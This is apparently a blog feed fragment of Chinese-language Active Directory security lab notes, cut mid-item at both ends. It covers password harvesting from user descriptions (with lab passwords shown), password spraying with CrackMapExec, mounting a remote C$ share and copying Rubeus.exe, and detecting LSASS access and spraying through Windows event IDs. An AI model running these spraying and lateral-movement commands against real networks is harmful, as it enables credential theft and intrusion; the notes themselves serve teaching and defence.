&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ Get-ADUser -Filter * -Proper Description | Select-object Name,Description
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Name Description
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>---- -----------
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Administrator Built-in account &lt;span style="color:#66d9ef">for&lt;/span> administering the computer/domain
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Guest Built-in account &lt;span style="color:#66d9ef">for&lt;/span> guest access to the computer/domain
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DefaultAccount A user account managed by the system.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>krbtgt Key Distribution Center Service Account
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Coraline Mahalia
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Gillian Marsiella
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Casi Hyacinth
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Mercy Edi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cyndie Rhodie
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Lucilia Lelah
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Fred Carmita
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Ortensia Fancy
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Seana Jeanette
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logan Janeen
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cassondra Lothario
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Ollie Dorita
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Gertrude Felecia
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Ella Randee New User ,DefaultPassword
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Anya Gypsy
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Ronni Kristoforo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Maurizia Ines
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Reyna Gwendolyn
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Garnet Constancia
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Darlleen Dorisa
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Jessa Corinna
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Lorne Celie
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Bill Marylee
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Berna Raphaela
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Gabriel Diannne Shared User
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Caitrin Latia
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Selestina Cassi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Carlye Chloette
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Dorrie Paolina
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Herminia Debby
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Rosetta Lotta
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Berny Kirby
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Moyra Fanechka
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Ranee Delinda
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Orelee Peri
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Shantee Marylin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Annice Eden
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Stormie Natala
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Glenda Dorrie
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Laurena Mirelle
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Casandra Cherrita
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Lazaro Karoly
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Lina Allene User Password r2NE4/9:F;&lt;span style="color:#f92672">[&lt;/span>k
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Kiri Kath
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Star Rikki
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Aloise Elfrida Shared User
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Marylynne Susannah
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Sherri Jacquetta
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Carey Kincaid
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Philippa Eugenie
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Dominica Carmon
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Eba Luca
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Martita Juanita
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Ruthie Ebony
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Charis Kory
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Bambi Etta
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Aleda Appolonia Shared User
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Randene Lelah
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Issy Eudora
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Margo Sharl
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Philis Gilli
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Reina Claire
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Corine Celesta
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Lon Sonni
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Joyann Sibella
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Katee Annemarie
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Henrieta Sabine
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Daile Odetta
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Marney Ranee
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Marlyn Loralee
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Fara Iseabal User Password 8F%kJ2q_cVFg
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Sofie Darlleen
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Jori Floria Replication Account
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Alikee Perri
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Karoly Nadeen
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Renae Babette
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nolana Rivy
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Carmelle Libbi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Sile Rhiamon
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Ruthann Britta
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Pietra Fern
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Amabelle Gayle
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Audi Rosalind
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Dollie Fayina
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Ricca Stefa
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Kaja Brenda
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Katharina Alyssa
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Angelique Hilda
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Linda Neda Shared User
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Jerrie Morganne
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Giulietta Moyra
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Erena Elinore
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Lily Kristofor
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Kizzee Margaux
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Christi Nettle
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Lilas Lindy
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Celeste Kelci
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Berget Celka
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Babb Joanne
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Andree Suki
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Bear Brown
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
帳密一、Lina Allene$\to$&lt;code>r2NE4/9:F;[k&lt;/code>
帳密二、Fara Iseabal$\to$&lt;code>8F%kJ2q_cVFg&lt;/code>&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(Password Spraying)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x14password-spraying/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x14password-spraying/</guid><description>&lt;h1 id="ntustisc---ad-note---labpassword-spraying">
 NTUSTISC - AD Note - Lab(Password Spraying)
 &lt;a class="anchor" href="#ntustisc---ad-note---labpassword-spraying">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;amp;t=4257">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>密碼收集
&lt;ul>
&lt;li>SAM.hive(Security Account Manager)&lt;/li>
&lt;li>Password Spraying(用猜的)
&lt;ul>
&lt;li>和brute force差在哪裡呢?其實概念一樣，只是角度不一樣，brute force是針對一隻帳號，用很多的密碼去猜；而password spraying則是用一組密碼去爆所有的帳號，其實就是反過來&lt;/li>
&lt;li>Tool: &lt;a href="https://github.com/Porchetta-Industries/CrackMapExec">CrackMapExec&lt;/a> - 結合各種功能的內網滲透神器&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>GPO&lt;/li>
&lt;li>記憶體(lsass)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="lab">
 Lab
 &lt;a class="anchor" href="#lab">#&lt;/a>
&lt;/h2>
&lt;h3 id="password-spraying">
 ==Password Spraying==
 &lt;a class="anchor" href="#password-spraying">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>How to use?&lt;/p>
&lt;ul>
&lt;li>Cheat Sheet
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ crackmapexec &amp;lt;protocol&amp;gt; &amp;lt;target&lt;span style="color:#f92672">(&lt;/span>s&lt;span style="color:#f92672">)&lt;/span>&amp;gt; -u &amp;lt;a file or string only&amp;gt; -p &amp;lt;a file or string only&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># For example&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ crackmapexec smb 10.10.10.100 -u administrator -p Passw0rd
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ crackmapexec smb 10.10.10.100 -u ~/file_usernames -p ~/file_passwords
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ crackmapexec smb 10.10.10.100 -u administrator -p Passw0rd --local-auth
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ crackmapexec smb &amp;lt;filename&amp;gt; -u administrator -p Passw0rd --local-auth
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;code>--local-auth&lt;/code>代表是用本機帳號的角度登入，就不是用domain admin的角度登入&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>Recon Password Policy
在PowerShell中使用&lt;code>$ Get-ADDefaultDomainPasswordPolicy&lt;/code>調查Domain上的密碼原則，Note: ==Win2016要打開==&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(SMB遠端讀寫)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x24smb%E9%81%A0%E7%AB%AF%E8%AE%80%E5%AF%AB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x24smb%E9%81%A0%E7%AB%AF%E8%AE%80%E5%AF%AB/</guid><description>&lt;h1 id="ntustisc---ad-note---labsmb遠端讀寫">
 NTUSTISC - AD Note - Lab(SMB遠端讀寫)
 &lt;a class="anchor" href="#ntustisc---ad-note---labsmb%e9%81%a0%e7%ab%af%e8%ae%80%e5%af%ab">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/ubNMQ7_dcm0?si=26g2Lz2CB-O-7S5d"> 2022/05/11 AD 安全 2 &lt;/a>&lt;/p>
&lt;h2 id="lab">
 Lab
 &lt;a class="anchor" href="#lab">#&lt;/a>
&lt;/h2>
&lt;p>這個lab主要和之前不太一樣的地方在於都是利用SMB的功能達到遠端電腦讀寫的效果，雖然遠端執行也可以做到，但這樣會比較方便&lt;/p>
&lt;h3 id="遠端讀寫w-gui">
 ==遠端讀寫(w/ GUI)==
 &lt;a class="anchor" href="#%e9%81%a0%e7%ab%af%e8%ae%80%e5%af%abw-gui">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>Open File Explorer&lt;/li>
&lt;li>Enter &lt;code>\\&amp;lt;IP&amp;gt;\c$&lt;/code>
For example: &lt;code>\\192.168.222.128\c$&lt;/code>&lt;/li>
&lt;li>Login Local Admin
&lt;img src="https://hackmd.io/_uploads/S1uCNUBlp.png" alt="" />&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>Result
我在Win10中利用上述步驟，成功讀取到Win2016的資料
&lt;img src="https://hackmd.io/_uploads/HJbEr8Bxa.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h3 id="遠端讀寫wo-gui">
 ==遠端讀寫(w/o GUI)==
 &lt;a class="anchor" href="#%e9%81%a0%e7%ab%af%e8%ae%80%e5%af%abwo-gui">#&lt;/a>
&lt;/h3>
&lt;p>沒有GUI的情況就需要先掛載遠端的C槽在本地端，然後才可以進行後續的讀寫，有時候他會跳出錯誤&lt;/p>
&lt;ul>
&lt;li>Cheat Sheet
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ net use &lt;span style="color:#ae81ff">\\&lt;/span>&amp;lt;IP&amp;gt;&lt;span style="color:#ae81ff">\C&lt;/span>$ &lt;span style="color:#e6db74">&amp;#34;&amp;lt;password&amp;gt;&amp;#34;&lt;/span> /user:&amp;lt;username&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::spoiler Result
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ net use &lt;span style="color:#ae81ff">\\&lt;/span>192.168.222.128&lt;span style="color:#ae81ff">\C&lt;/span>$ &lt;span style="color:#e6db74">&amp;#34;1qaz@WSX3edc&amp;#34;&lt;/span> /user:administrator &lt;span style="color:#75715e"># 掛載遠端磁碟&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>命令已經成功完成。
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ net use &lt;span style="color:#75715e"># 查看已掛載的遠端磁碟&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>會記錄新的網路連線。
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>狀態 本機 遠端 網路
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-------------------------------------------------------------------------------
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>OK &lt;span style="color:#ae81ff">\\&lt;/span>192.168.222.128&lt;span style="color:#ae81ff">\C&lt;/span>$ Microsoft Windows Network
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>命令已經成功完成。
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ copy Rubeus.exe &lt;span style="color:#ae81ff">\\&lt;/span>192.168.222.128&lt;span style="color:#ae81ff">\C&lt;/span>$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>複製了 &lt;span style="color:#ae81ff">1&lt;/span> 個檔案。
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;img src="https://hackmd.io/_uploads/BykOL8rgT.png" alt="" />
可以看到Win2016的C槽中多了一個Rubeus.exe的檔案，代表成功
:::&lt;/li>
&lt;/ul>
&lt;h3 id="how-to-detect-smb-access">
 ==How to Detect SMB Access==
 &lt;a class="anchor" href="#how-to-detect-smb-access">#&lt;/a>
&lt;/h3>
&lt;p>Event ID: 5145
預設不開，因為會有大量的event湧入，除非設定有存取c$的filter，就會少非常多，因為遠端存取c槽本身就蠻可疑的，所以偵測到非法存取的機率就蠻高的&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(偵測LSASS)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x17%E5%81%B5%E6%B8%AClsass/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x17%E5%81%B5%E6%B8%AClsass/</guid><description>&lt;h1 id="ntustisc---ad-note---lab偵測lsass">
 NTUSTISC - AD Note - Lab(偵測LSASS)
 &lt;a class="anchor" href="#ntustisc---ad-note---lab%e5%81%b5%e6%b8%aclsass">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;amp;t=4257">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>得到更高權限之後，會想要更多的密碼&lt;/p>
&lt;ul>
&lt;li>密碼收集
&lt;ul>
&lt;li>SAM.hive(Security Account Manager)&lt;/li>
&lt;li>Password Spraying(用猜的)&lt;/li>
&lt;li>GPO&lt;/li>
&lt;li>記憶體(lsass)
&lt;ul>
&lt;li>How to detect LSASS access?
利用Sysmon這個工具中有設定的event ID: 10，這個工具類似Event Viewer但更多元更強，下載可見&lt;a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon">Sysmon&lt;/a>&lt;/li>
&lt;li>How to install?
簡單來說它需要先準備一個config file，然後安裝的時候就會一起把config設定好(每一間公司或每一個人都不一樣，算是機密)
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ Sysmon64.exe -i sysmonconfig-export.xml
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="lab">
 Lab
 &lt;a class="anchor" href="#lab">#&lt;/a>
&lt;/h2>
&lt;h3 id="偵測lsass">
 ==偵測LSASS==
 &lt;a class="anchor" href="#%e5%81%b5%e6%b8%aclsass">#&lt;/a>
&lt;/h3>
&lt;p>利用Sysmon Event ID: 10&lt;/p>
&lt;ol>
&lt;li>準備sysmonconfig
就像前面說的，每一間公司的sysmonconfig都是機密，所以我們這次的lab，講師也有準備簡易的sysmonconfig
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;Sysmon&lt;/span> &lt;span style="color:#a6e22e">schemaversion=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;4.1&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;HashAlgorithm&amp;gt;&lt;/span>SHA256&lt;span style="color:#f92672">&amp;lt;/HashAlgorithm&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;EventFiltering&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;ProcessAccess&lt;/span> &lt;span style="color:#a6e22e">default=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;include&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/ProcessAccess&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/EventFiltering&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/Sysmon&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>安裝Sysmon
按照前面提到的指令，並把sysconfig準備好
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ Sysmon64.exe -i sysmonconfig-export.xml
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>System Monitor v15.0 - System activity monitor
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>By Mark Russinovich and Thomas Garnier
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Copyright &lt;span style="color:#f92672">(&lt;/span>C&lt;span style="color:#f92672">)&lt;/span> 2014-2023 Microsoft Corporation
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Using libxml2. libxml2 is Copyright &lt;span style="color:#f92672">(&lt;/span>C&lt;span style="color:#f92672">)&lt;/span> 1998-2012 Daniel Veillard. All Rights Reserved.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Sysinternals - www.sysinternals.com
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Loading configuration file with schema version 4.10
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Sysmon schema version: 4.90
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::warning
實作中這邊遇到問題，理論上準備好sysmonconfig之後下command應該會安裝，但他只跑到一半就結束了，不確定是不是因為沒有連網還是其他設定沒有做好，總之，sysmon算是不能用了，所以之後還有其他的lab會用到就只能跳過
:::&lt;/li>
&lt;li>Skip&lt;/li>
&lt;/ol></description></item><item><title>NTUSTISC - AD Note - Lab(偵測密碼揮灑)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x15%E5%81%B5%E6%B8%AC%E5%AF%86%E7%A2%BC%E6%8F%AE%E7%81%91/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x15%E5%81%B5%E6%B8%AC%E5%AF%86%E7%A2%BC%E6%8F%AE%E7%81%91/</guid><description>&lt;h1 id="ntustisc---ad-note---lab偵測密碼揮灑">
 NTUSTISC - AD Note - Lab(偵測密碼揮灑)
 &lt;a class="anchor" href="#ntustisc---ad-note---lab%e5%81%b5%e6%b8%ac%e5%af%86%e7%a2%bc%e6%8f%ae%e7%81%91">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;amp;t=4257">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>得到更高權限之後，會想要更多的密碼&lt;/p>
&lt;ul>
&lt;li>密碼收集
&lt;ul>
&lt;li>SAM.hive(Security Account Manager)&lt;/li>
&lt;li>Password Spraying(用猜的)
&lt;ul>
&lt;li>和brute force差在哪裡呢?其實概念一樣，只是角度不一樣，brute force是針對一隻帳號，用很多的密碼去猜；而password spraying則是用一組密碼去爆所有的帳號，其實就是反過來&lt;/li>
&lt;li>Tool: &lt;a href="https://github.com/Porchetta-Industries/CrackMapExec">CrackMapExec&lt;/a> - 結合各種功能的內網滲透神器&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>GPO&lt;/li>
&lt;li>記憶體(lsass)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="lab">
 Lab
 &lt;a class="anchor" href="#lab">#&lt;/a>
&lt;/h2>
&lt;h3 id="lab-how-to-detect-password-spraying">
 ==Lab: How to detect Password Spraying==
 &lt;a class="anchor" href="#lab-how-to-detect-password-spraying">#&lt;/a>
&lt;/h3>
&lt;p>利用Event ID: 4625, 4648, 4771的認證失敗紀錄
&lt;img src="https://hackmd.io/_uploads/ryxGszmR2.png" alt="" />
可以看到我是大約在4:52:08左右執行的，有一大堆的4625紀錄，如果抓最後一筆的紀錄，會顯示Account Name就是我們在Kali看到的最後一個帳戶，而且Keyword顯示Audit Failure
&lt;img src="https://hackmd.io/_uploads/SJ0wszXA2.png" alt="" />&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(偵測提權)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x11%E5%81%B5%E6%B8%AC%E6%8F%90%E6%AC%8A/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x11%E5%81%B5%E6%B8%AC%E6%8F%90%E6%AC%8A/</guid><description>&lt;h1 id="ntustisc---ad-note---lab偵測提權">
 NTUSTISC - AD Note - Lab(偵測提權)
 &lt;a class="anchor" href="#ntustisc---ad-note---lab%e5%81%b5%e6%b8%ac%e6%8f%90%e6%ac%8a">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=M0LV3dBCMCOy58LN&amp;amp;t=3600">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>提權方法
&lt;ul>
&lt;li>利用弱點&lt;/li>
